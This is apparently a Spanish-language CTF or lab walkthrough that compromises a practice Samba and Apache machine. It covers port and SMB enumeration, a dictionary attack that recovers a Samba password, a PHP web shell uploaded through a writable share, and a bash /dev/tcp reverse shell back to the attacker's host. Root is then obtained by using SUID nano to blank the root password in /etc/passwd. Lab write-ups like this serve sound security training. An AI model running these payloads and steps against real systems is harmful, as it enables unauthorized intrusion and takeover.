# Enumeracion de Puertos, Servicios y Versiones

```ruby
nmap -Pn -n -sS -p- --open -sCV --min-rate 5000 172.17.0.2 -oN nmap
```
```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-24 09:47 -03
Nmap scan report for 172.17.0.2
Host is up (0.0000040s latency).
Not shown: 65532 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.52 ((Ubuntu))
|_http-title: \xC2\xBFQu\xC3\xA9 es Samba?
|_http-server-header: Apache/2.4.52 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:11:00:02 (Unknown)

Host script results:
| smb2-time: 
|   date: 2024-11-24T12:47:43
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.43 seconds
```

servicio web y samba levantados, primero chequeo el servicio web

![image](https://github.com/user-attachments/assets/12f900c5-a056-4f90-a3c6-28c1f36bd3ec)

fuzzeo y busco sub-dominios pero nada por aqui, asi que paso al servicio samba

```ruby
enum4linux-ng 172.17.0.2
```
```bash
ENUM4LINUX - next generation (v1.3.4)

 ==========================
|    Target Information    |
 ==========================
[*] Target ........... 172.17.0.2
[*] Username ......... ''
[*] Random Username .. 'zchilrit'
[*] Password ......... ''
[*] Timeout .......... 5 second(s)

 ===================================
|    Listener Scan on 172.17.0.2    |
 ===================================
[*] Checking LDAP
[-] Could not connect to LDAP on 389/tcp: connection refused
[*] Checking LDAPS
[-] Could not connect to LDAPS on 636/tcp: connection refused
[*] Checking SMB
[+] SMB is accessible on 445/tcp
[*] Checking SMB over NetBIOS
[+] SMB over NetBIOS is accessible on 139/tcp

 =========================================================
|    NetBIOS Names and Workgroup/Domain for 172.17.0.2    |
 =========================================================
[-] Could not get NetBIOS names information via 'nmblookup': timed out

 =======================================
|    SMB Dialect Check on 172.17.0.2    |
 =======================================
[*] Trying on 445/tcp
[+] Supported dialects and settings:
Supported dialects:
  SMB 1.0: false
  SMB 2.02: true
  SMB 2.1: true
  SMB 3.0: true
  SMB 3.1.1: true
Preferred dialect: SMB 3.0
SMB1 only: false
SMB signing required: false

 =========================================================
|    Domain Information via SMB session for 172.17.0.2    |
 =========================================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found domain information via SMB
NetBIOS computer name: D2E4779A542B
NetBIOS domain name: ''
DNS domain: ''
FQDN: d2e4779a542b
Derived membership: workgroup member
Derived domain: unknown

 =======================================
|    RPC Session Check on 172.17.0.2    |
 =======================================
[*] Check for null session
[+] Server allows session using username '', password ''
[*] Check for random user
[+] Server allows session using username 'zchilrit', password ''
[H] Rerunning enumeration with user 'zchilrit' might give more results

 =================================================
|    Domain Information via RPC for 172.17.0.2    |
 =================================================
[+] Domain: WORKGROUP
[+] Domain SID: NULL SID
[+] Membership: workgroup member

 =============================================
|    OS Information via RPC for 172.17.0.2    |
 =============================================
[*] Enumerating via unauthenticated SMB session on 445/tcp
[+] Found OS information via SMB
[*] Enumerating via 'srvinfo'
[+] Found OS information via 'srvinfo'
[+] After merging OS information we have the following result:
OS: Linux/Unix
OS version: '6.1'
OS release: ''
OS build: '0'
Native OS: not supported
Native LAN manager: not supported
Platform id: '500'
Server type: '0x809a03'
Server type string: Wk Sv PrQ Unx NT SNT d2e4779a542b server (Samba, Ubuntu)

 ===================================
|    Users via RPC on 172.17.0.2    |
 ===================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 user(s) via 'enumdomusers'
[+] After merging user results we have 2 user(s) total:
'1000':
  username: james
  name: james
  acb: '0x00000010'
  description: ''
'1001':
  username: bob
  name: bob
  acb: '0x00000010'
  description: ''

 ====================================
|    Groups via RPC on 172.17.0.2    |
 ====================================
[*] Enumerating local groups
[+] Found 0 group(s) via 'enumalsgroups domain'
[*] Enumerating builtin groups
[+] Found 0 group(s) via 'enumalsgroups builtin'
[*] Enumerating domain groups
[+] Found 0 group(s) via 'enumdomgroups'

 ====================================
|    Shares via RPC on 172.17.0.2    |
 ====================================
[*] Enumerating shares
[+] Found 3 share(s):
IPC$:
  comment: IPC Service (d2e4779a542b server (Samba, Ubuntu))
  type: IPC
html:
  comment: HTML Share
  type: Disk
print$:
  comment: Printer Drivers
  type: Disk
[*] Testing share IPC$
[-] Could not check share: STATUS_OBJECT_NAME_NOT_FOUND
[*] Testing share html
[+] Mapping: DENIED, Listing: N/A
[*] Testing share print$
[+] Mapping: DENIED, Listing: N/A

 =======================================
|    Policies via RPC for 172.17.0.2    |
 =======================================
[*] Trying port 445/tcp
[+] Found policy:
Domain password information:
  Password history length: None
  Minimum password length: 5
  Maximum password age: 49710 days 6 hours 21 minutes
  Password properties:
  - DOMAIN_PASSWORD_COMPLEX: false
  - DOMAIN_PASSWORD_NO_ANON_CHANGE: false
  - DOMAIN_PASSWORD_NO_CLEAR_CHANGE: false
  - DOMAIN_PASSWORD_LOCKOUT_ADMINS: false
  - DOMAIN_PASSWORD_PASSWORD_STORE_CLEARTEXT: false
  - DOMAIN_PASSWORD_REFUSE_PASSWORD_CHANGE: false
Domain lockout information:
  Lockout observation window: 30 minutes
  Lockout duration: 30 minutes
  Lockout threshold: None
Domain logoff information:
  Force logoff time: 49710 days 6 hours 21 minutes

 =======================================
|    Printers via RPC for 172.17.0.2    |
 =======================================
[+] No printers returned (this is not an error)

Completed after 6.01 seconds
```
lo que me interesa de esta informacion es la enumeracion de los usuarios 


![image](https://github.com/user-attachments/assets/86c7e225-d59c-42ee-a50f-da42439d625b)


aplico un ataque de diccionario contra el servicio samba y los usuarios que he conseguido

```ruby
crackmapexec smb 172.17.0.2 -u bob -p /usr/share/wordlists/rockyou.txt |grep -v STATUS_LOGON_FAILURE
```

![image](https://github.com/user-attachments/assets/32b584ce-fb85-45db-b7f5-49861dd7fef6)

ahora puedo enumerar recursos compartidos

```ruby
smbmap -u 'bob' -p 'star' -H 172.17.0.2
```

![image](https://github.com/user-attachments/assets/d65bad7c-f048-413e-9638-7e88f7a16b4b)

puedo escribir y leer en `html` asi que con `whatweb` chequeo las tecnologias que usa el servicio web

```ruby
whatweb 'http://172.17.0.2'
```

![image](https://github.com/user-attachments/assets/829ed93a-36cf-48fa-9474-7e56e5103c46)

veo que esta corriendo un `apache`, cargare un codigo `php` a ver si lo llega a interpretar y logro la ejecucion de comandos

```code.php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

para cargar este archivo malicioso usare `smbclient`

```ruby
smbclient //172.17.0.2/html -U bob%star
```

![image](https://github.com/user-attachments/assets/e4c666c9-22b7-47eb-87ad-8e83e3142184)

cargo el php con `put code.php` en la consola interactiva que abre `smbclient` y voy al navegador a probar si funciona


![image](https://github.com/user-attachments/assets/7f4587db-bd14-447e-8290-4545531169d3)


consigo ejecucion remota de comandos, por lo que ahora envio una revershell

revershell a enviar:
```ruby
/bin/bash -i >& /dev/tcp/172.17.0.1/4450 0>&1
```
urlencodeo

```ruby
urlencode 'bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4450 0>&1"'
```

revershell a enviar
```bash
bash%20-c%20%22%2Fbin%2Fbash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.17.0.1%2F4450%200%3E%261%22
```

![image](https://github.com/user-attachments/assets/d6d55773-8bf9-486e-9fc9-6e7016ff6060)

# Escalada de Privilegios

### `www-data`

tratamiento de la tty

```ruby
script /dev/null -c bash
^Z
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash && stty rows 38 cols 168
```
los user del sistema son `bob` y `james` como ya se habia reportado en `enum4linux-ng` pero la escalada en este caso se puede realizar directo hasta `root`, primero buscamos binarios con
el BIT SUID

```ruby
find / -perm -4000 2>/dev/null
```
```bash
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/nano
```

vemos que `/usr/bin/nano` lo tiene asgnado, por lo que editare el archivo `/etc/passwd` 

```ruby
/usr/bin/nano /etc/passwd
```

aqui edito el archivo dejando la linea de `root` asi: `root::0:0:root:/root:/bin/bash` (solo se elimina la `x` que contiene), guardamos y salimos... ahora escalamos a `root` con un `su`

![image](https://github.com/user-attachments/assets/ff3e1dad-cfe1-42cf-bea7-9b1bb3706ce1)

### `ROOT`

























